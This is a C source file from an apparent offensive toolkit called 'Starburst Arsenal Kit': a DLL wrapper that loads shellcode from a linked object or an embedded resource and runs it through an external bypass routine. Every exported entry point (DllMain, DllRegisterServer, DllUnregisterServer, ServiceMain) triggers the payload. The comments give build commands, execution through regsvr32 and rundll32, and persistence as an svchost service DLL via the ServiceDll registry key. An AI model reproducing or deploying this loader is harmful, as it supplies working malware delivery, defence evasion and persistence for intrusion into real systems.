/*
 * Starburst Arsenal Kit - DLL Wrapper
 *
 * DLL wrapper with multiple execution entry points:
 *   - DllMain (DLL_PROCESS_ATTACH)       -- triggers on LoadLibrary / injection
 *   - DllRegisterServer                  -- triggers via regsvr32 /s or rundll32
 *   - ServiceMain                        -- triggers when loaded as a service DLL
 *
 * Build (MinGW):
 *   x86_64-w64-mingw32-gcc -shared -O2 -s -o starburst.dll \
 *       src/main_dll.c bypass/bypass_fiber.c shellcode.o \
 *       -lkernel32 -luser32 -ladvapi32
 *
 * Build (MSVC):
 *   cl /O2 /LD src/main_dll.c bypass/bypass_fiber.c shellcode.obj \
 *       /link kernel32.lib user32.lib advapi32.lib
 *
 * Execution methods:
 *   regsvr32 /s starburst.dll
 *   rundll32 starburst.dll,DllRegisterServer
 *   sc create svc binPath= "svchost.exe -k netsvcs" (with ServiceDll registry key)
 *
 * Shellcode source (choose one):
 *   1. Link a shellcode object file exporting shellcode[] and shellcode_len
 *   2. Define SHELLCODE_FROM_RSRC to load from the .rsrc section instead
 */

#include <windows.h>

/* --------------------------------------------------------------------
 * Bypass interface
 * ------------------------------------------------------------------ */
extern void execute_shellcode(unsigned char *shellcode, unsigned int shellcode_len);

/* --------------------------------------------------------------------
 * Shellcode symbols (linked object file)
 * ------------------------------------------------------------------ */
#ifndef SHELLCODE_FROM_RSRC
extern unsigned char  shellcode[];
extern unsigned int   shellcode_len;
#endif

/* --------------------------------------------------------------------
 * Resource-based shellcode loading
 * ------------------------------------------------------------------ */
#ifdef SHELLCODE_FROM_RSRC
#define IDR_SHELLCODE  101

static int load_shellcode_from_rsrc(HMODULE hModule, unsigned char **out_buf, unsigned int *out_len)
{
    HRSRC   hRes;
    HGLOBAL hGlobal;
    LPVOID  pData;
    DWORD   dwSize;

    hRes = FindResourceA(hModule, MAKEINTRESOURCEA(IDR_SHELLCODE), "RCDATA");
    if (!hRes)
        return -1;

    hGlobal = LoadResource(hModule, hRes);
    if (!hGlobal)
        return -1;

    pData  = LockResource(hGlobal);
    dwSize = SizeofResource(hModule, hRes);
    if (!pData || dwSize == 0)
        return -1;

    *out_buf = (unsigned char *)pData;
    *out_len = (unsigned int)dwSize;
    return 0;
}
#endif

/* --------------------------------------------------------------------
 * Internal: resolve shellcode and execute
 * ------------------------------------------------------------------ */
static HMODULE g_hModule = NULL;
static volatile LONG g_executed = 0;

static void run_payload(void)
{
    unsigned char *sc_buf = NULL;
    unsigned int   sc_len = 0;

    /* Ensure single execution across all entry points */
    if (InterlockedCompareExchange(&g_executed, 1, 0) != 0)
        return;

#ifdef SHELLCODE_FROM_RSRC
    if (load_shellcode_from_rsrc(g_hModule, &sc_buf, &sc_len) != 0)
        return;
#else
    sc_buf = shellcode;
    sc_len = shellcode_len;
#endif

    if (sc_buf == NULL || sc_len == 0)
        return;

    execute_shellcode(sc_buf, sc_len);
}

/* --------------------------------------------------------------------
 * DllMain -- fires on LoadLibrary / reflective injection
 *
 * Set EXECUTE_ON_ATTACH to 1 to trigger immediately on load.
 * Default is 0: payload runs only through an exported function.
 * ------------------------------------------------------------------ */
#ifndef EXECUTE_ON_ATTACH
#define EXECUTE_ON_ATTACH 0
#endif

BOOL WINAPI DllMain(HINSTANCE hInstDll, DWORD dwReason, LPVOID lpReserved)
{
    (void)lpReserved;

    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
        g_hModule = hInstDll;
        DisableThreadLibraryCalls(hInstDll);
#if EXECUTE_ON_ATTACH
        run_payload();
#endif
        break;

    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}

/* --------------------------------------------------------------------
 * Exported: DllRegisterServer
 *
 * Called by regsvr32 /s or rundll32.
 * Signature matches the COM registration prototype.
 * ------------------------------------------------------------------ */
__declspec(dllexport) HRESULT WINAPI DllRegisterServer(void)
{
    run_payload();
    return S_OK;
}

/* --------------------------------------------------------------------
 * Exported: DllUnregisterServer
 *
 * Provided for completeness; some execution chains call this instead.
 * ------------------------------------------------------------------ */
__declspec(dllexport) HRESULT WINAPI DllUnregisterServer(void)
{
    run_payload();
    return S_OK;
}

/* --------------------------------------------------------------------
 * Exported: ServiceMain
 *
 * Entry point when the DLL is loaded as a service DLL by svchost.exe.
 * Registry key:
 *   HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters
 *     ServiceDll = REG_EXPAND_SZ  C:\path\starburst.dll
 * ------------------------------------------------------------------ */
__declspec(dllexport) void WINAPI ServiceMain(DWORD dwArgc, LPWSTR *lpszArgv)
{
    (void)dwArgc;
    (void)lpszArgv;

    run_payload();
}
